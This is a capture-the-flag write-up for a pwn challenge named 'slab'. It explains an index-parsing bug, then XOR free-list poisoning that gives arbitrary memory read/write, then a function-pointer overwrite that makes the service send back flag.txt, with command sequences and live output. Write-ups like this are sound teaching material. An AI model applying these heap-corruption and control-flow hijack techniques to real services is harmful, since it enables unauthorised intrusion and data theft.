# slab

**Event:** CryoVault CTF 2026
**Category:** pwn
**Flag:** `isfcr{cust0m_sl4b_n0_gl1bc_r3c1p3_s4v3s_y0u}`

---

## 1. Recon - the interface

On connect the banner is a prompt:

```
slab store. commands: alloc | free <i> | edit <i> <hex> | read <i> | report | quit
>
```

| Command | Reply | Notes |
|---|---|---|
| `alloc` | `idx N` / `no index slots` | returns the smallest free index, 16 slots max |
| `free <i>` | `ok` / `bad index` | marks a slot free |
| `edit <i> <hex>` | `ok` | writes `min(len,96)` decoded bytes into note *i* |
| `read <i>` | `data <hex>` | returns 96 bytes of note *i* (192 hex chars) |
| `report` | `nothing to report.` | |
| `quit` | (closes) | |

`alloc`/`report`/`quit` are prefix-matched; `free`/`edit`/`read` need the exact word + space.

## 2. Bug #1 - index-parsing mismatch (`atoi` vs `strtol`)

The bounds check and the array access do not parse the index the same way:

```c
if      (strncmp(buf,"free ",5)==0)  { int i=atoi(buf+5);   if (i<0||i>15) die("bad index"); free(i);  }
```

The check uses **`atoi`**, which stops at the first non-digit (`atoi("0x10") == 0`,
`atoi("-x") == 0`), while the access path uses **`strtol(..., 0)`**, which honours `0x`/sign/
whitespace (`strtol("0x10",0,0) == 16`). So `read 0x10`, `read -0x1`, `edit 0x10 …` all pass the
bounds check and index *outside* the table. Handy, but by itself it only walks linearly and we
found the table neighbourhood to be zeros - it was **not** the winning bug.

## 3. Bug #2 - XOR-encoded free-list + note aliasing (the real primitive)

Each note is not stored inline; the store keeps 16 note **data pointers** in a table at
`0x4b6b00` (`slots[]`), a used-flag bitmap at `0x4b6ac0`, a free-list head at `0x4b6b80`, and a
per-process random XOR key at `0x4b6b90` (seeded once with `getrandom`).

`free(i)` does **not** wipe the note - it XOR-encodes the free-list link into the note's first 8
bytes, and `alloc()` decodes the head with the same key to obtain the *next note's data pointer*:

```
free(i):   *(slots[i]) = next ^ KEY
alloc():   next = *(freelist_head) ; slots[new] = next ^ KEY   (i.e. = the decoded link)
```

Because we control the bytes of a freed note, we control the decoded pointer, so we can make a
note's **data pointer point anywhere**. The cleanest target is the `slots[]` table itself:

```
alloc x4 ; free 1 ; free 0
edit 0 <p64(0x4b6b00 ^ KEY)>     # encode SLOTS so alloc decodes to &slots[0]
alloc ; alloc                    # note1 now ALIASES the slot-pointer table
```

Writing note 1 now rewrites the entire pointer table, and the store becomes a **fully arbitrary
96-byte read/write primitive at any address**:

- `edit 1 <12 qwords>` → sets `slots[0..11]` to any addresses
- `read u` → returns the 96 bytes at `slots[u]` (arbitrary read, byte-aligned)
- `edit u <hex>` → writes at `slots[u]` (arbitrary write, byte-aligned)

**Key recovery is trivial and restart-proof**: `alloc; free 0; read 0` returns
`0 ^ KEY = KEY` in the first 8 bytes (observed `0x618d5153e0045e29` on the live server).

> `fastread.py` packages the setup + the pipelined `read11([addr,…])` (11 windows per connection).

## 4. Recovering the program

With arbitrary read I dumped the ELF header and program headers, then the user code (below the
statically-linked glibc). Segments: `.text` `0x400000–0x4867fd`, `.rodata` `0x487000–0x4afbf0`,
`.data/.bss` `0x4b09c8–0x4bd1e8` - non-PIE, so every address is fixed.

Dumping the tight rodata pointer cluster at `0x487228–0x4872e2` yielded the program's own strings:

```
alloc / free  / edit  / read  / report / quit
idx %d
arena full            the vault is empty on this host
banner                slab store. commands: …
flag.txt              ★
[chall] slab on 127.0.0.1:%d
```

The string **`flag.txt`** is at `0x4872d4`. Tracing its reference lands in a small function at
**`0x4022e6`** - `load_flag()`:

```asm
4022e6  lea   rsp,[rsp-0xb8]
402301  mov   esi,0                 ; O_RDONLY
402306  mov   edi,0x4872d4          ; "flag.txt"
40230b  call  open
402312  js    0x40235d              ; open failed -> log "the vault is empty on this host"
40231e  mov   rsi,rsp               ; buf  = local 0xa0 stack buffer
402321  mov   edx,0xa0
402328  call  read                  ; read(fd, rsp, 0xa0)
40236f  mov   edi,[0x4b50c8]        ; ★ the *client socket fd*, set by the handler on entry
402375  call  write                 ; write(clientfd, buf, n)   <-- would hand us the flag
```

So `load_flag()` **opens `flag.txt`, reads it into a stack buffer, and writes it to the global fd
`0x4b50c8`**. And `0x4b50c8` is set to **our connection's socket fd** by the per-connection
handler (`mov [0x4b50c8], edi` at `0x401de1`).

## 5. The dispatch hijack

In the command handler, `report` is not a hard-coded call - it goes through a **function pointer**:

```asm
401ed6  mov   esi,0x4872b1          ; "report"
401edb  call  strncmp
401ee2  jne   0x40225c
401ee8  call  QWORD PTR [0x4b50d0]  ; ★ indirect call
```

`[0x4b50d0]` currently holds `0x401d6c`, a stub that logs `"nothing to report."`. That pointer
lives in writable `.data`, and we have an arbitrary write.

## 6. Exploit

```
1. setup the alias             -> note1->data = 0x4b6b00 (the pointer table)
2. arbitrary write:
       *0x4b50d0 = 0x4022e6     ( load_flag )
3. send:  report
   -> handler calls load_flag()
   -> open("flag.txt"); read(fd, buf, 0xa0); write(clientfd, buf, n)
   -> the flag is printed to our socket
```

Live output:

```
funcptr now: e622400000000000 (want e622400000000000)
--- report output ---
b'isfcr{cust0m_sl4b_n0_gl1bc_r3c1p3_s4v3s_y0u}\n> '
```

`solve.py` / `exploit_flag.py` reproduce it end-to-end; it was run twice, identical flag.

## 7. Why this is the intended bug

The description - *"Convince it to hand you something that was never filed"* - is exactly what
happens: the flag was **never filed into the note store**; we make the store read a file it was
never supposed to expose, and hand it back through its own `report` path. The note-store's
free-list XOR encoding ("slab" = a slab allocator) is the vulnerability: an attacker-controlled
free-list link gives an aliased note and thus arbitrary read/write, which turns an inert
`report` function pointer into a flag-exfiltration gadget.

## 8. Artifacts

| File | Purpose |
|---|---|
| `exploit_flag.py` | one-shot solve (setup → hijack → `report`) |
| `fastread.py` | arbitrary-read engine (`FR`, `read11`, per-process KEY) |
| `dumprange.py` | dump an arbitrary memory range pgm→file |
| `HANDOFF.md` | state notes from the (pre-solve) session |
| `t*.py`, `scan*.py`, `fscan.py`, `rscan.py`, `stackleak.py` | probing/scanning variants used along the way |

## 9. Pitfalls encountered

- Long **background** scans stall - the server throttles/limits commands per connection.
  Run scans in the **foreground** in single-connection chunks, reconnecting on EOF.
- Index-only OOB (bug #1) is a red herring: the adjacent memory is zeros. The win comes from
  bug #2 (pointer aliasing), not from walking the index past the table.
- A 96-byte-granular read is enough, but the pointer-based primitive is byte-aligned - no need to
  worry about strings straddling note boundaries.
- The XOR key is **per-process**; derive it live (`alloc; free 0; read 0`) rather than hard-coding.

